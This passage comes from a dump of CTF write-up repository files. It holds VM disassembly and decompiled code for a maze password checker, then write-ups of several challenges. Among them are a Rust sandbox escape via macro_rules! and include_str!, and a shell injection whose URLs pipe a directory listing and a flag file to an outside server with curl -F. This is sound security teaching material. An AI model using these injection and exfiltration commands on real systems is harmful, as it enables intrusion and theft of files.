0x945\n\n0x07CB: regG  = 0xFF9C + regF\n0x07FA: if (regG) goto 0x852 else goto 0x81F\n\n0x081F: regF  = 0x10\n0x0843: goto 0x945\n\n0x0852: regG  = 0xFF94 + regF\n0x0881: if (regG) goto 0x8DC else goto 0x8A6\n\n0x08A6: regF  = 0xFFFF\n0x08CD: goto 0x945\n\n0x08DC: regE  = 0x0\n0x08FF: regF  = 0x0\n0x0922: regI  = 0x1\n0x0945: regD  = regD + regF\n0x0973: regA  = 0xFFEF\n0x0999: *regA = regD\n0x09BE: regA  = 0xFFF0\n0x09E4: regF  = *regA\n0x0A09: if (regF) goto 0xD65 else goto 0xA2E\n\n0x0A2E: regA  = 0xF000 + regD\n0x0A5C: regF  = *regA\n0x0A81: regA  = 0xFFEF\n0x0AA7: *regA = regF\n0x0ACC: regA  = 0xFFF0\n0x0AF2: *regA = 0x0\n0x0B14: regA  = 0xFFEF\n0x0B3A: regF  = *regA\n0x0B5F: regF  = regF + regF\n0x0B8D: regA  = 0x7000 + regF\n0x0BBB: regF  = *regA\n0x0BE0: if (regF) goto 0xD10 else goto 0xC05\n\n0x0C05: regF  = 0x1 + regC\n0x0C30: regA  = 0xF102 + regF\n0x0C5E: regF  = *regA\n0x0C83: regF  = regF + regD\n0x0CB1: if (regF) goto 0x60C else goto 0xCD6\n\n0x0CD6: regC  = 0x1 + regC\n0x0D01: goto 0x60C\n\n0x0D10: regE  = 0x0\n0x0D33: regI  = 0x2\n0x0D56: goto 0x60C\n\n0x0D65: regI  = 0x4\n0x0D88: halt\n\n0x0D97: if (regE) goto 0xDCB else goto 0x13D9\n\n0x0DCB: regF  = 0xFFF7 + regC\n0x0DFA: if (regF) goto 0xE2E else goto 0xE60\n\n0x0E2E: regI  = 0x3\n0x0E51: goto 0x13D9\n\n0x0E60: regB  = 0x0\n0x0E82: regC  = 0x0\n0x0EA5: regD  = 0xFFD9 + regB\n0x0ED3: if (regD) goto 0xF07 else goto 0x137B\n\n0x0F07: regE  = 0x4\n0x0F2A: regD  = 0x0\n0x0F4D: regD  = regD + regD\n0x0F7B: regD  = regD + regD\n0x0FA9: regA  = 0xE000 + regC\n0x0FD7: regF  = *regA\n0x0FFC: regG  = 0xFF8B + regF\n0x102B: if (regG) goto 0x105F else goto 0x1218\n\n0x105F: regG  = 0xFF8E + regF\n0x108E: if (regG) goto 0x10ED else goto 0x10B3\n\n0x10B3: regD  = 0x1 + regD\n0x10DE: goto 0x1218\n\n0x10ED: regG  = 0xFF9C + regF\n0x111C: if (regG) goto 0x117B else goto 0x1141\n\n0x1141: regD  = 0x2 + regD\n0x116C: goto 0x1218\n\n0x117B: regG  = 0xFF94 + regF\n0x11AA: if (regG) goto 0x13D9 else goto 0x11CF\n\n0x11CF: regD  = 0x3 + regD\n0x11FA: goto 0x1218\n\n0x1218: regC  = 0x1 + regC\n0x1243: regE  = 0xFFFF + regE\n0x1272: if (regE) goto 0xF4D else goto 0x1297\n\n0x1297: regA  = 0xF10C + regB\n0x12C4: regE  = *regA\n0x12E9: regA  = 0xE800 + regB\n0x1316: *regA = regE + regD\n0x1343: regB  = 0x1 + regB\n0x136C: goto 0xEA5\n\n0x137B: regA  = 0xE800 + regB\n0x13A8: *regA = 0x0\n0x13CA: halt\n\n0x13D9: regA  = 0xE800\n0x13FF: *regA = 0x0\n0x1421: halt\n", "timestamp": "2025-10-24T11:39:31.706202"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2020-08-22-Google-CTF/files/sprint-code.txt", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2020-08-22-Google-CTF/files/sprint-code.txt", "content": "// initialise the map walls\n[0x7000] = 0x0001;\n[0x7002] = 0x0001;\n\nlet map_position = 0x0002;\ndo {\n  if ([0x7000 + map_position * 2] == 0) {\n    let sub_position = map_position * 2;\n    while (true) {\n      [0xFFEF] = sub_position;\n      if ([0xFFF0]) break;\n      [0x7000 + sub_position * 2] = 0x0001;\n      sub_position += map_position;\n    }\n  }\n  map_position += 0x0001;\n} while (map_position);\n\n// calculate the length of user input\nlet user_input_ptr = 0xE000;\nlet user_input_negative_length = 0;\nwhile ([user_input_ptr]) {\n  user_input_negative_length -= 1;\n  user_input_ptr += 1;\n}\n\n// if the user input is not 254 characters long, halt\nif (-254 != user_input_negative_length) {\n  error_num = 5;\n  [0xE800] = 0;\n  halt;\n}\n\n// check user password, navigate the maze\nlet pw_position = 0;\nlet checkpoint_counter = 0;\nlet map_position = [0xF100];\nlet pw_valid = 1;\nerror_num = 0;\n\nwhile (true) {\n  // take the next byte of the password\n  let pw_byte = [0xE000 + pw_position];\n  if (!pw_byte) break;\n  pw_position += 1;\n\n  // up / right / down / left\n  let map_delta;\n  if (pw_byte == 'u') {\n    map_delta = -16;\n  } else if (pw_byte == 'r') {\n    map_delta = 1;\n  } else if (pw_byte == 'd') {\n    map_delta = 16;\n  } else if (pw_byte == 'l') {\n    map_delta = -1;\n  } else {\n    pw_valid = 0x0000;\n    map_delta = 0;\n    error_num = 1;\n  }\n  map_position += map_delta;\n\n  // if we went out of bounds, halt\n  [0xFFEF] = map_position;\n  if ([0xFFF0]) {\n    error_num = 4;\n    halt;\n  }\n\n  // if we bumped into a wall, halt (eventually)\n  [0xFFEF] = [0xF000 + map_position];\n  [0xFFF0] = 0x0000;\n  if ([0x7000 + [0xFFEF] * 2]) { // note [0xFFEF] re-mapping coordinates\n    pw_valid = 0;\n    error_num = 2;\n    continue;\n  }\n\n  // if we hit a checkpoint, increase the checkpoint counter\n  if ([0xF103 + checkpoint_counter] == -map_position) {\n    checkpoint_counter += 1;\n  }\n}\n\n// if some characters were invalid or we bumped into a wall, halt\nif (!pw_valid) {\n  [0xE800] = 0x0000;\n  halt;\n}\n\n// if we did not make it through exactly 9 checkpoints, halt\nif (checkpoint_counter != 9) {\n  error_num = 3;\n  [0xE800] = 0x0000;\n  halt;\n}\n\n// success, let's decode the flag\n//\n// decoding consists of 39 rounds where 4 bytes of the password are taken,\n// an 8-bit checksum value is generated from them, then the checksum is added\n// to the encrypted flag stored in the program memory\nlet flag_position = 0;\nlet pw_position = 0;\nwhile (flag_position != 39) {\n  let block_counter = 4;\n  let checksum = 0;\n\n  do {\n    checksum *= 4;\n    let pw_byte = [0xE000 + pw_position];\n    if (pw_byte == 'u') {\n      // checksum += 0x0000;\n    } else if (pw_byte == 'r') {\n      checksum += 0x0001;\n    } else if (pw_byte == 'd') {\n      checksum += 0x0002;\n    } else if (pw_byte == 'l') {\n      checksum += 0x0003;\n    } else {\n      [0xE800] = 0x0000;\n      halt;\n    }\n    pw_position += 1;\n    block_counter -= 1;\n  } while (block_counter);\n\n  [0xE800 + flag_position] = [0xF10C + flag_position] + checksum;\n  flag_position += 0x0001;\n}\n\n// add a null byte and let's call it a string\n[0xE800 + flag_position] = 0x0000;\nhalt;\n", "timestamp": "2025-10-24T11:39:31.851275"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2020-08-22-Google-CTF/files/sprint-reflow.txt", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2020-08-22-Google-CTF/files/sprint-reflow.txt", "content": "[0x7000] = 0x0001;\n[0x7002] = 0x0001;\nvar2 = 0x0002;\n\ndo {\n  if ([0x7000 + var2 * 2] == 0) {\n    var6 = var2 * 2;\n    while (true) {\n      [0xFFEF] = var6;\n      if ([0xFFF0]) break;\n      [0x7000 + var6 * 2] = 0x0001;\n      var6 += var2;\n    }\n  }\n  var2 += 0x0001;\n} while (var2);\n\nvar11 = 0xE000;\nvar12 = 0x0000;\nwhile ([var11]) {\n  var12 -= 0x0001;\n  var11 += 0x0001;\n}\n\nif (0x00FE + var12) {\n  var16 = 0x0005;\n  [0xE800] = 0x0000;\n  halt;\n}\n\nvar17 = 0x0000;\nvar18 = 0x0000;\nvar20 = [0xF100];\nvar21 = 0x0001;\nvar22 = 0x0000;\n\nwhile (true) {\n  var24 = [0xE000 + var17];\n  if (!var24) break;\n\n  var17 += 0x0001;\n  if (var24 == 'u') {\n    var26 = 0xFFF0;\n  } else if (var24 == 'r') {\n    var26 = 0x0001;\n  } else if (var24 == 'd') {\n    var26 = 0x0010;\n  } else if (var24 == 'l') {\n    var26 = 0xFFFF;\n  } else {\n    var21 = 0x0000;\n    var26 = 0x0000;\n    var30 = 0x0001;\n  }\n\n  var20 += var26;\n  [0xFFEF] = var20;\n  if ([0xFFF0]) {\n    var38 = 0x0004;\n    halt;\n  }\n\n  [0xFFEF] = [0xF000 + var20];\n  [0xFFF0] = 0x0000;\n  if ([0x7000 + [0xFFEF] * 2]) {\n    var21 = 0x0000;\n    var37 = 0x0002;\n    continue;\n  }\n  if ([0xF102 + 0x0001 + var18] + var20) continue;\n  var18 += 0x0001;\n}\n\nif (!var21) {\n  [0xE800] = 0x0000;\n  halt;\n}\n\nif (var18 != 9) {\n  var40 = 0x0003;\n  [0xE800] = 0x0000;\n  halt;\n}\n\nvar41 = 0x0000;\nvar42 = 0x0000;\n\nwhile (var41 != 39) {\n  var44 = 0x0004;\n  var45 = 0x0000;\n\n  do {\n    var45 *= 4;\n    var47 = [0xE000 + var42];\n    if (var47 == 'u') {\n      // var45 += 0x0000;\n    } else if (var47 == 'r') {\n      var45 += 0x0001;\n    } else if (var47 == 'd') {\n      var45 += 0x0002;\n    } else if (var47 == 'l') {\n      var45 += 0x0003;\n    } else {\n      [0xE800] = 0x0000;\n      halt;\n    }\n    var42 += 0x0001;\n    var44 -= 0x0001;\n  } while (var44);\n\n  [0xE800 + var41] = [0xF10C + var41] + var45;\n  var41 += 0x0001;\n}\n\n[0xE800 + var41] = 0x0000;\nhalt;\n", "timestamp": "2025-10-24T11:39:32.011896"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2020-08-22-Google-CTF/files/sprint-renum.txt", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2020-08-22-Google-CTF/files/sprint-renum.txt", "content": "0x0000: (from -)\n  [0x7000] = 0x0001\n  [0x7002] = 0x0001\n  var2 = 0x0002\n\n0x00DA: (from 0x0324, 0x0000)\n  if ([0x7000 + var2 * 2]) goto 0x0324 else goto 0x0180\n\n0x0180: (from 0x00DA)\n  var6 = var2 * 2\n\n0x01AE: (from 0x0269, 0x0180)\n  [0xFFEF] = var6\n  if ([0xFFF0]) goto 0x0324 else goto 0x0269\n\n0x0269: (from 0x01AE)\n  [0x7000 + var6 * 2] = 0x0001\n  var6 += var2\n  goto 0x01AE\n\n0x0324: (from 0x00DA, 0x01AE)\n  var2 += 0x0001\n  if (var2) goto 0x00DA else goto 0x0374\n\n0x0374: (from 0x0324)\n  var11 = 0xE000\n  var12 = 0x0000\n\n0x03BD: (from 0x043A, 0x0374)\n  if ([var11]) goto 0x043A else goto 0x04A1\n\n0x043A: (from 0x03BD)\n  var12 -= 0x0001\n  var11 += 0x0001\n  goto 0x03BD\n\n0x04A1: (from 0x03BD)\n  if (0x00FE + var12) goto 0x0504 else goto 0x0536\n\n0x0504: (from 0x04A1)\n  var16 = 0x0005\n  goto 0x13D9\n\n0x0536: (from 0x04A1)\n  var17 = 0x0000\n  var18 = 0x0000\n  var20 = [0xF100]\n  var21 = 0x0001\n  var22 = 0x0000\n\n0x060C: (from 0x0C05, 0x0CD6, 0x0D10, 0x0536)\n  var24 = [0xE000 + var17]\n  if (var24) goto 0x0692 else goto 0x0D97\n\n0x0692: (from 0x060C)\n  var17 += 0x0001\n  if (0xFF8B + var24) goto 0x0745 else goto 0x070F\n\n0x070F: (from 0x0692)\n  var26 = 0xFFF0\n  goto 0x0945\n\n0x0745: (from 0x0692)\n  if (0xFF8E + var24) goto 0x07CB else goto 0x0799\n\n0x0799: (from 0x0745)\n  var26 = 0x0001\n  goto 0x0945\n\n0x07CB: (from 0x0745)\n  if (0xFF9C + var24) goto 0x0852 else goto 0x081F\n\n0x081F: (from 0x07CB)\n  var26 = 0x0010\n  goto 0x0945\n\n0x0852: (from 0x07CB)\n  if (0xFF94 + var24) goto 0x08DC else goto 0x08A6\n\n0x08A6: (from 0x0852)\n  var26 = 0xFFFF\n  goto 0x0945\n\n0x08DC: (from 0x0852)\n  var21 = 0x0000\n  var26 = 0x0000\n  var30 = 0x0001\n\n0x0945: (from 0x070F, 0x0799, 0x081F, 0x08A6, 0x08DC)\n  var20 += var26\n  [0xFFEF] = var20\n  if ([0xFFF0]) goto 0x0D65 else goto 0x0A2E\n\n0x0A2E: (from 0x0945)\n  [0xFFEF] = [0xF000 + var20]\n  [0xFFF0] = 0x0000\n  if ([0x7000 + [0xFFEF] * 2]) goto 0x0D10 else goto 0x0C05\n\n0x0C05: (from 0x0A2E)\n  if ([0xF102 + 0x0001 + var18] + var20) goto 0x060C else goto 0x0CD6\n\n0x0CD6: (from 0x0C05)\n  var18 += 0x0001\n  goto 0x060C\n\n0x0D10: (from 0x0A2E)\n  var21 = 0x0000\n  var37 = 0x0002\n  goto 0x060C\n\n0x0D65: (from 0x0945)\n  var38 = 0x0004\n  halt\n\n0x0D97: (from 0x060C)\n  if (var21) goto 0x0DCB else goto 0x13D9\n\n0x0DCB: (from 0x0D97)\n  if (0xFFF7 + var18) goto 0x0E2E else goto 0x0E60\n\n0x0E2E: (from 0x0DCB)\n  var40 = 0x0003\n  goto 0x13D9\n\n0x0E60: (from 0x0DCB)\n  var41 = 0x0000\n  var42 = 0x0000\n\n0x0EA5: (from 0x1297, 0x0E60)\n  if (0xFFD9 + var41) goto 0x0F07 else goto 0x137B\n\n0x0F07: (from 0x0EA5)\n  var44 = 0x0004\n  var45 = 0x0000\n\n0x0F4D: (from 0x1218, 0x0F07)\n  var45 *= 4\n  var47 = [0xE000 + var42]\n  if (0xFF8B + var47) goto 0x105F else goto 0x1218\n\n0x105F: (from 0x0F4D)\n  if (0xFF8E + var47) goto 0x10ED else goto 0x10B3\n\n0x10B3: (from 0x105F)\n  var45 += 0x0001\n  goto 0x1218\n\n0x10ED: (from 0x105F)\n  if (0xFF9C + var47) goto 0x117B else goto 0x1141\n\n0x1141: (from 0x10ED)\n  var45 += 0x0002\n  goto 0x1218\n\n0x117B: (from 0x10ED)\n  if (0xFF94 + var47) goto 0x13D9 else goto 0x11CF\n\n0x11CF: (from 0x117B)\n  var45 += 0x0003\n  goto 0x1218\n\n0x1218: (from 0x0F4D, 0x10B3, 0x1141, 0x11CF)\n  var42 += 0x0001\n  var44 -= 0x0001\n  if (var44) goto 0x0F4D else goto 0x1297\n\n0x1297: (from 0x1218)\n  [0xE800 + var41] = [0xF10C + var41] + var45\n  var41 += 0x0001\n  goto 0x0EA5\n\n0x137B: (from 0x0EA5)\n  [0xE800 + var41] = 0x0000\n  halt\n\n0x13D9: (from 0x0504, 0x0D97, 0x0E2E, 0x117B)\n  [0xE800] = 0x0000\n  halt\n", "timestamp": "2025-10-24T11:39:32.164233"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2021-07-17-Google-CTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2021-07-17-Google-CTF/README.md", "content": "# 2021-07-17-Google-CTF #\n\n[CTFTime link](https://ctftime.org/event/1318) | [Website](https://capturetheflag.withgoogle.com/)\n\n---\n\n## Challenges ##\n\nNote: incomplete listing.\n\n - [x] [50 filestore](#50-misc--filestore)\n - [x] [234 parking](#234-hardware--parking)\n - [x] [203 memsafety](#203-pwn--memsafety)\n\n---\n\n## 50 misc / filestore ##\n\nThis challenge is a kind of \"file system\" where data is stored in chunks in a central byte array. The chunk storage uses Python dictionaries and is not really part of the data stored, because there is no limit on how many files can exist. The only limiting factor is the byte array itself, which is 64 KiB (65536 bytes) long.\n\nThe flag is stored in the filesystem to begin with, but we cannot retrieve it, because we do not know its ID and it is too difficult to guess (16 alphanumeric characters).\n\nThe interesting feature of the system is that it can store more than 64 KiB of data by using deduplication. This happens inside the `store` function:\n\n```python\nprefix = data[:MINIMUM_BLOCK] # data[:16]\nind = -1\nbestlen, bestind = 0, -1\nwhile True:\n    ind = blob.find(prefix, ind+1)\n    if ind == -1: break\n    length = len(os.path.commonprefix([data, bytes(blob[ind:ind+MAXIMUM_BLOCK])]))\n    if length > bestlen:\n        bestlen, bestind = length, ind\n```\n\nWe start by considering the first 16 bytes of the data to be stored. If there is less than 16 bytes left, the prefix is shorter (this will become important soon). The code looks for occurrences of this prefix and, using [`os.path.commonprefix`](https://docs.python.org/3/library/os.path.html#os.path.commonprefix), finds a place in the byte array where the longest prefix of the data to be stored can be found.\n\nThis deduplication method saves space but also leaks knowledge about the flag, because we can also check how many bytes are occupied after storing data of our choosing.\n\nAs an example, consider a situation where the flag has already been stored in the byte array (2). We can try to guess a prefix of the flag. If it is incorrect (3a), the prefix will not match the byte array and will be stored in a new section. If it is correct (3b), the prefix is already in the byte array and no new data needs to be stored.\n\n![](files/filestore-example.png)\n\nAt this point, we can figure out the flag character by character:\n\n1. Initialise `known_prefix` to `CTF{` (same across all challenges).\n2. Connect to the server.\n3. For every character (`a-zA-Z0-9_`), check if `known_prefix` + `character` is a correct prefix of the flag by storing it on the server and checking if the used space changed.\n4. Append the correct character to `known_prefix`, go back to 2 until no new characters are found (because the last character is `}`).\n\n`CTF{CR1M3_0f_d3dup1ic4ti0n}`\n\nThe flag is a reference to the [CRIME](https://en.wikipedia.org/wiki/CRIME) exploit, which relied on similar deduplication properties of data compression.\n\n## 234 hardware / parking ##\n\nIn this challenge we are presented with a game of [Rush Hour](https://en.wikipedia.org/wiki/Rush_Hour_%28puzzle%29). The goal is to slide the \"cars\" (gray and green blocks) around to make space for the red car to enter the parking lot. There are two levels. The first one is trivial:\n\n![](files/parking-l1.png)\n\nThe second one is *much* larger, with an image of it spanning 2620 × 28636 pixels. Fortunately, most of the puzzle is empty space. The arrangement resembles an electronic circuit, with lines of cars serving as wires. Different kinds of [logic gates](https://en.wikipedia.org/wiki/Logic_gate) can also be found.\n\n**Splitter**\n\n![](files/parking-splitter.gif)\n\n**Crossing**\n\n![](files/parking-crossing.gif)\n\n**And gate**\n\n![](files/parking-and.gif)\n\n**Or gate**\n\n![](files/parking-or.gif)\n\nApart from these local features, we can also find larger groupings of gates:\n\n![](files/parking-l2-unit-y.png)\n\nAssuming the inputs are `A`, `B`, `C`, and `D`, \"Unit Y\" has 4 outputs:\n\n| Output | Logical formula                      |\n| ------ | ------------------------------------ |\n| `I`    | `(A && C) || (B && D)`               |\n| `J`    | `(A && D) || (B && C)`               |\n| `K`    | `((A && C) || (A && D)) || (B && C)` |\n| `L`    | `B && D`                             |\n\n\"Unit X\" is actually the same as unit Y, but it does not have outputs `K` and `L`.\n\nZooming out a bit further, we can see these units arranged in 64 rows. Here is one:\n\n![](files/parking-l2-row.png)\n\nHere is the same row with the units highlighted:\n\n![](files/parking-l2-annotated.png)\n\nEach of these rows has one green car on the left (F). The green cars can be moved or left unmoved, which affects the \"signal\" in the remainder of the row. Whether the car was moved or not encodes a single bit of the flag, for a total of 64 bits, or 8 bytes.\n\nThere are also \"wires\" which seem to lead nowhere (BS1, BS2, BS3 above), always in pairs:\n\n![](files/parking-l2-stream.png)\n\nThere are three such pairs in every row. In each pair, one wire allows the cars to move, one does not. In other words, these wires form three bitstreams (and their complement).\n\nFinally, we can encode the circuit into SMT and find a solution using Z3.\n\n[Encoder script](script/Parking.hx), [Generated Z3 script](script/parking.z3)\n\nIn the output model we can find:\n\n```\n(define-fun flag () (_ BitVec 64) #x6d31724265685432)\n```\n\nReversing the bytes above, we get the flag.\n\n`CTF{2TheBr1m}`\n\n## 203 pwn / memsafety ##\n\nIn this challenge, we can provide Rust code to be compiled on the server alongside other code which stores the flag. The code we provide is wrapped with:\n\n```rust\n#![no_std]\nuse proc_sandbox::sandbox;\n\n#[sandbox]\npub mod user {\n    // ...\n}\n```\n\nThe wrapping above in addition to the Python script for the challenge ensure that:\n\n- we do not have access to `std` types (but the [`core`](https://doc.rust-lang.org/core/index.html) is always there);\n- we do not escape the module with a `}` character, ensured by checking the JSON dump of the AST; and\n- our code is validated using the [procedural macro attribute](https://doc.rust-lang.org/reference/procedural-macros.html#attribute-macros) `#[sandbox]`.\n\nThe `#[sandbox]` attribute itself performs *syntax-based* validation by visiting the untyped AST (using [`syn::visit::Visit`](https://docs.rs/syn/1.0.74/syn/visit/trait.Visit.html)). This further ensures that:\n\n- we do not use [`unsafe`](https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html) expressions, as we could violate memory safety with these;\n- we do not declare foreign items (`extern { ... }`), as these could let us use unsafe C functions (although we could not call them without using `unsafe` anyway);\n- we do not import external crates (`extern crate ...`), as these could let us use `std` or even the crate containing the actual flag; and\n- we cannot use certain blacklisted identifiers: `env`, `file`, `include`, `include_bytes`, `include_str`, `option_env`, `std`.\n\n[`include_str!`](https://doc.rust-lang.org/std/macro.include_str.html) in particular could be very useful, as it would allow us to simply include the source code of the file containing the flag.\n\nHowever, the check performed by `#[sandbox]` has a flaw. In particular, the check is purely syntactic, and implemented using the Rust parser [`syn`](https://docs.rs/syn/) (which has its own AST representation). In Rust, [function-like macros](https://doc.rust-lang.org/reference/procedural-macros.html#function-like-procedural-macros) can be used to extend the language with otherwise-illegal syntax. Consider the following piece of code:\n\n```rust\nsome_macro_call!(anything goes here! 1 2 3);\n```\n\nWhen `syn` is visiting the AST of this call, it cannot do anything about the code between the parentheses, as this code must be parsed by `some_macro_call` and may be otherwise illegal Rust syntax (as is the case here). In other words, the `syn` AST representation for the above with only show that this is a macro call to `some_macro_call` and will contain unprocessed tokens for the \"arguments\". We can see that the [`tokens` field](https://docs.rs/syn/1.0.74/syn/struct.Macro.html#structfield.tokens) of `syn::Macro` is indeed only a `TokenStream`. Compare this with [`args`](https://docs.rs/syn/1.0.74/syn/struct.ExprMethodCall.html#structfield.args) of `syn::ExprMethodCall`, where arguments to a regular method call are encoded as (list of) `syn::Expr`, i.e. deeply parsed ASTs.\n\nFurthermore, Rust provides a simple way to declare function-like macros anywhere: [`macro_rules!`](https://doc.rust-lang.org/rust-by-example/macros.html). Here is an example declaration:\n\n```rust\nmacro_rules! foo {\n  () => { println!(\"foo\"); };\n}\n```\n\nA call to `foo!()` would then expand to `println!(\"foo\");` (which would further expand to calls to actually print something to `stdout`). But notice that the `macro_rules!` declaration itself is a macro call. This means that `syn` cannot deeply parse a `macro_rules!` declaration.\n\nAt this point we can write our \"exploit\". We can use blacklisted functions inside a `macro_rules!` declaration, then call that macro. One possible way to read the flag without the blacklist restrictions, but also without being able to use `std` (which is where `println!` can be found) is to crash the program with the flag provided as the panic message:\n\n```rust\nmacro_rules! foo {\n  () => { panic!(include_str!(\"/home/user/sources/user-1/src/lib.rs\")); };\n}\nfoo!();\n```\n\n`CTF{s4ndb0x1n9_s0urc3_1s_h4rd_ev3n_1n_rus7}`\n", "timestamp": "2025-10-24T11:39:33.064312"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2025-06-14-smileyCTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2025-06-14-smileyCTF/README.md", "content": "# 2021-07-17-Google-CTF\n\n[CTFTime link](https://ctftime.org/event/2591) | [Website](https://play.ctf.gg/)\n\n---\n\n## Challenges\n\nNote: I played with the [organisers team](https://ctftime.org/team/42934). The write-ups below are for challenges where I did a large part of the work (and found the time to actually write a write-up).\n\n### Misc\n\n- [x] 10 Sanity Check\n- [x] 50 sky\n- [x] 76 cowsay\n- [x] [135 TI-1983](#135-misc--ti-1983)\n- [x] 165 multisig-wallet\n- [x] 262 Project Holoswap\n- [x] 345 vs-math-ai\n- [x] [352 offset](#352-misc--offset)\n- [ ] 469 TI-1984\n\n### Web\n\n- [x] 50 Sculpture Revenge\n- [x] 50 Extension Mania\n- [x] 138 dry-ice-n-co\n- [x] 156 Extension Mania revenge\n- [x] 378 Teemo's Secret\n- [ ] 469 Leaf\n\n### Reversing\n\n- [x] 50 Success\n- [x] 50 fORtran\n- [x] 50 Easy Come Easy Go\n- [x] [156 DNA](#156-reversing--dna)\n- [x] 238 liqUID glASS\n- [x] [408 Fruit Ninja](#408-reversing--fruit-ninja)\n- [ ] 500 100r1cs\n- [ ] 500 tables\n\n### Pwn\n\n- [x] 50 debuggable-1\n- [x] 102 debuggable-2\n- [x] 114 babyrop\n- [x] 216 blargh\n- [x] 234 limit\n- [ ] 419 debuggable-3\n- [x] 469 teemo-tuesday\n- [x] 484 accelerator\n\n### Crypto\n\n- [x] 50 saas\n- [x] 109 never enough\n- [ ] 322 LCGs are SBGs\n- [x] 388 a special place in reality\n- [ ] 430 sums\n- [x] 456 spontaneous\n- [ ] 500 flcg\n\n### Forensics\n\n- [x] 162 rorecovery2\n- [ ] 322 rorecovery1\n- [ ] 388 rorecovery3\n\n### GuessCTF\n\n- [ ] 500 guessctf\n\n---\n\n## 135 Misc / TI-1983\n\n**Description**\n\nNothing wrong here. Nope. Stev the intern is very good at writing code.\n\n**Files provided**\n\n- [`ti-1983.tar.gz`](files/ti-1983.tar.gz)\n\n**Solution**\n\nWe are presented with a basic calculator-like tool: we can enter a query, choose one of two \"templates\", and be presented with the result rendered in that template. Works for small math queries and rejects most queries longer than 3 characters.\n\nInternally, the challenge went about answering our queries in a pretty strange fashion:\n\n1. accept the `code` (our query) and the `template` as inputs in the query string;\n2. check that the `code` is short (more on that later);\n3. create a temporary Python file by pasting our `code` into a Python script template, where the code is surrounded by triple quotes, compiled using [RestrictedPython](https://pypi.org/project/RestrictedPython/), and then `eval`ed with no `builtin`s;\n4. construct a URL (pointing to the same server) to the `static` endpoint, with our `template` passed in the query string;\n5. check that the URL does not have too many emojis (or non-ASCII characters in general);\n6. request the URL using an external process (`curl.exe -s {url}`);\n7. check that the result contains the substring `{out}`;\n8. execute the temporary Python file created in step 3;\n9. substitute the output of that execution into the template.\n\nThere are a lot of strange choices here, but given the CTF also had a \"TI-1984\" challenge, we first looked at the `diff` between the two challenges, to see which parts might be relevant. In fact, only one file changed, `server.py`:\n\n```diff\n27c27\n<     if len(code) > 3 and any(c in code for c in \"0123456789+*-/\"):\n---\n>     if len(code) > 3:\n37c37\n<     out_tmpl = os.popen(f\"curl.exe -s {url}\").read()\n---\n>     out_tmpl = subprocess.run(['curl.exe', '-s', url], stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.decode()\n```\n\nAs a result, we focused on step 6, which, since the `url` string is not sanitised at all, allows for [shell injection](https://en.wikipedia.org/wiki/Code_injection#Shell_injection). After some time wasted on trying to make this work using additional arguments provided to `curl` (such as `-F` to upload a file over HTTP to a server we controls), I realised just piping into other commands works just fine in `os.popen`, even on Windows.\n\nWith that in mind, we could list the directory as so:\n\n```sh\ncurl \"https://(the remote)/ti-84?code=1&tmpl=normal.tmpl+|+dir+|+curl+http://(our server):1337+-F+%22x=@-%22+\"\n```\n\nThis pipes the output of `dir` (directory listing) as POST data to our server. It should be possible to construct similar commands which create a valid \"template\" (that passes step 7 above) while still containing the output of a directory listing or the flag, but we already had the server ready. With the command above, our server received a request like so:\n\n```\nPOST / HTTP/1.1\nHost: (our server):1337\nUser-Agent: curl/8.14.1\nAccept: */*\nContent-Length: 722\nContent-Type: multipart/form-data; boundary=------------------------P4dBWlPaa89vvIacc41anm\n\n--------------------------P4dBWlPaa89vvIacc41anm\nContent-Disposition: form-data; name=\"x\"; filename=\"-\"\n\n Volume in drive C has no label.\n Volume Serial Number is 2C73-C453\n\n Directory of C:\\app\n\n06/14/2025  04:41 AM    <DIR>          .\n06/14/2025  04:29 AM               208 code_tmpl.py\n06/04/2025  05:42 AM         3,730,024 curl.exe\n06/14/2025  04:29 AM              (33) flag_4dfa54cf005d9fea.txt\n06/12/2025  06:47 AM                23 requirements.txt\n06/14/2025  04:29 AM             1,927 server.py\n06/14/2025  04:41 AM    <DIR>          static\n               5 File(s)      3,732,215 bytes\n               2 Dir(s)  136,137,388,032 bytes free\n\n--------------------------P4dBWlPaa89vvIacc41anm--\n```\n\nAfter finding the flag filename (which is chosen at random every time the instance is launched), we could upload to our server with the same approach:\n\n```sh\ncurl \"https://(the remote)/ti-84?code=1&tmpl=normal.tmpl+|+type+flag_4dfa54cf005d9fea.txt+|+curl+http://(our server):1337+-F+%22x=@-%22+\"\n```\n\n(After the CTF we realised we could have also escaped the restricted Python jail as long as we avoided using any of the characters `\"0123456789+*-/\"`.)\n\n`.;,;.{command_injection_in_2025?}`\n\n## 352 Misc / offset\n\n**Description**\n\nsomehow this exists, don't question why\n\n**Files provided**\n\n- [`offset.tar.gz`](files/offset.tar.gz)\n\n**Solution**\n\nThe setup for this challenge seems simple enough:\n\n```python\n#!/usr/local/bin/python\nx = input(\"text: \")\nif all((i % 2 != j % 2)*(j % ((i % 4) + 1) == 0) for i,j in enumerate(x.encode())):\n    exec(x)\n```\n\nAfter an easily overlooked [shebang](https://en.wikipedia.org/wiki/Shebang_(Unix)), we are prompted for a line of input which will be `exec`uted, as long as it passes this strange check. Let's degolf it a little bit.\n\n- `for i,j in enumerate(x.encode())`: the check walks through each byte of our input string (as encoded in UTF-8), keeping the (0-based) byte offset in `i` and the byte value in `j`;\n- for each byte, it checks two things:\n  - `(i % 2 != j % 2)`, that is:\n    - bytes at even positions must have an odd value\n    - bytes at odd positions must have an even value\n  - `(j % ((i % 4) + 1) == 0)`, that is:\n    - bytes at position 0, 4, 8, 12, ... must have a value divisible by 1\n    - bytes at position 1, 5, 9, 13, ... must have a value divisible by 2\n    - bytes at position 2, 6, 10, 14, ... must have a value divisible by 3\n    - bytes at position 3, 7, 11, 15, ... must have a value divisible by 4\n- `(i % 2 != j % 2) * (j % ((i % 4) + 1) == 0)`: multiplying the two checks together requires *both* to hold\n- `all(...)`: finally, the cheks above must hold for *all* bytes of the input\n\nThe above explanation is still hard to visualise, so it's best to visualise 